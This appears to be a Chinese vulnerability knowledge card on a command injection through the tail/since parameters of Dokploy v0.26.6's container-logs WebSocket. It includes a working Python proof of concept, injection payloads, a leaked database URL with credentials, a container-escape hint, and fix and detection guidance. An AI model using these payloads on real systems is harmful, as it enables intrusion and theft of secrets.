---
id: web-generic-websocket-dokploy-container-logs-tail-since-injection
title: Dokploy v0.26.6 修复遗漏 /docker-container-logs：tail/since 未校验导致 WebSocket 命令注入
type: scenario
domain: web
path: web/generic/websocket
technique: dokploy-container-logs-param-command-injection
aliases:
- Dokploy 日志端点命令注入
- docker-container-logs 注入
- tail 参数注入
- since 参数注入
- Dokploy v0.26.6 绕过
tags:
- websocket
- command-injection
- dokploy
- docker
- nodejs
- tail
- since
- authenticated-rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Dokploy v0.26.6（/docker-container-terminal 已修复，/docker-container-logs 仍拼接 tail/since）
verification:
  verified_by: verifier-V37
  verified_at: '2026-11-05T05:59:07+08:00'
  notes: 已对照原文核对：端点源码、tail/since 拼接与 spawn(sh,-c) 执行、截图 whoami/cat /etc/passwd/DATABASE_URL 泄露均一致；docker.sock 逃逸为原文未验证延伸；未在本机复现。受影响版本 v0.26.6 与原文一致。
---

## 一句话结论

Dokploy v0.26.6 只修复了 `/docker-container-terminal` 的命令注入，遗漏了 `/docker-container-logs`：该 WebSocket 端点把未校验的 `tail`、`since` 直接拼进 `docker container logs ...` 命令字符串并用 `spawn(shell, ["-c", command])` 执行；已登录用户把 `tail` 设为 `10; id; #` 即可截断原命令并执行任意 shell 命令。

## 原理

- `/docker-container-logs` 的 `on("connection")` 从 URL 读取 `containerId`、`tail`、`search`、`since`、`serverId`、`runType`；只检查 `containerId` 是否为空和 `user/session` 是否存在，没有调用 `isValidContainerId()`。
- 命令构造为字符串拼接：
  `docker ${runType==='swarm'?'service':'container'} logs --timestamps ${runType==='swarm'?'--raw':''} --tail ${tail} ${since==='all'?'':`--since ${since}`} --follow ${containerId}`
- 随后用 `spawn(shell, ["-c", command])` 执行，`-c` 会让 shell 解释整段字符串。`containerId` 位于命令末尾，直接注入 `x;cmd;#` 时会受 URL 解析/后续参数影响；而 `tail`、`since` 位于命令中段，注入后可以提前终止 docker 命令，再用 `#` 注释掉尾部 `--follow`。
- 例如 `tail=10; whoami; #` 实际执行：
  `docker container logs --timestamps --tail 10; whoami; # --follow 123123`
  shell 先执行原始 docker 命令（可能报错），再执行 `whoami`，`#` 后面全部忽略。
- `since` 同理：`since=1h; whoami; #` 会执行 `--since 1h; whoami;`。
- 根因与已修复的终端端点相同：用户输入进入 `sh -c` 字符串。修复只覆盖了一个端点，新增/遗漏的同类端点仍可复用原攻击面；即使 `containerId` 被校验，中段参数未校验仍可注入。
- 由于 Dokploy 容器通常挂载宿主机 `/var/run/docker.sock`，注入命令可进一步调用 docker（如挂载宿主机根目录）；本文只验证了命令执行与数据库 URL 泄露，未展示逃逸。

## 触发条件

- Dokploy v0.26.6（或包含该日志端点且未修复的版本）。
- 攻击者拥有有效登录会话（`user`/`session` 校验通过；低权限账号即可）。
- `/docker-container-logs` WebSocket 可达。
- `tail`、`since` 参数可控且未做格式校验（`containerId` 只需非空）。

## 利用步骤

1. 登录 Dokploy 获取会话 Cookie。
2. 连接 WebSocket：`ws://target:3001/docker-container-logs?containerId=123&tail=<URL 编码后的 payload>`。
3. payload 设为 `10; id; #`（`#` 必须编码为 `%23`，避免被当作 URL fragment）。
4. 从 WebSocket 读取输出，确认 `id` 等命令结果。
5. 泄露敏感信息：`tail=10; env | grep DATABASE; #` 可拿到 `DATABASE_URL`（含数据库账号密码）。
6. `since` 变体：`containerId=123&tail=10&since=1h; whoami; #`。
7. 若容器挂载 `docker.sock`，可尝试 `docker run --rm -v /:/host ... chroot /host` 等逃逸命令；该步为延伸，本文未验证。

## PoC

```python
import asyncio
from urllib.parse import quote
import websockets

async def exploit(target, cookie, tail_payload):
    uri = (f"{target.replace('http','ws')}/docker-container-logs"
           f"?containerId=123&tail={quote(tail_payload)}")
    out = ""
    async with websockets.connect(uri, additional_headers={"Cookie": cookie}) as ws:
        while True:
            try:
                out += await asyncio.wait_for(ws.recv(), timeout=2)
            except asyncio.TimeoutError:
                break
    return out

# asyncio.run(exploit("http://target:3001", "session=...", "10; id; #"))
# asyncio.run(exploit("http://target:3001", "session=...", "10; env | grep DATABASE; #"))
```

服务端实际命令：

```text
docker container logs --timestamps --tail 10; id; # --follow 123
                                  └──────────┘ └────┘
                                  原命令截断   注入执行
```

原文截图确认：`tail=10; whoami; #` 返回命令执行结果；`tail=10; env | grep DATABASE; #` 返回 `DATABASE_URL=postgresql://dokploy:dokploy123@postgres:5432/dokploy`。

## 变体与关联

- `since` 注入：`1h; <cmd>; #`，与 `tail` 等价。
- 其他中段参数：`search`、`runType` 若也参与命令拼接，可按同样思路测试；`runType` 还控制 `container/service` 子命令。
- 直接 `containerId` 注入在本文测试未成功（可能被 URL 解析/位置影响），但中段参数已足够。
- 与 [[web-generic-websocket-dokploy-container-terminal-command-injection]]（CVE-2026-24841）同源：同一产品、同一 `spawn(shell, ["-c", ...])` 缺陷，本卡是修复遗漏的第二个端点；修复时应统一收敛到参数数组 + 严格校验。
- 若目标挂载 docker.sock，可接 [[cloud/container]] 层的 Docker socket 逃逸思路。

## 检测与防御

- 修复 `/docker-container-logs`：`containerId` 走 `isValidContainerId()`；`tail` 强制整数（合理范围）、`since` 用时间格式白名单；`search`/`runType` 枚举校验。
- 改用数组参数：`spawn("docker", ["container","logs","--timestamps","--tail",tail,...,"--follow",containerId], { shell: false })`，禁止 `sh -c` 拼接。
- 不要只修一个端点：审计所有 WebSocket/HTTP 中把 query 参数拼进 shell 的位置，统一封装安全执行函数。
- 限制登录权限与 WebSocket 来源；Dokploy 管理面不对公网暴露；容器尽量不挂载 docker.sock，或使用只读/受限 socket 代理。
- 检测：WebSocket 握手 URL 的 `tail`/`since` 含 `;`、`|`、`&`、`$(`、反引号、空格、`#`；`tail` 非纯数字、`since` 非 `all`/数字+单位；异常 `/docker-container-logs` 连接与命令输出；Dokploy 容器内出现非预期 docker 子命令。
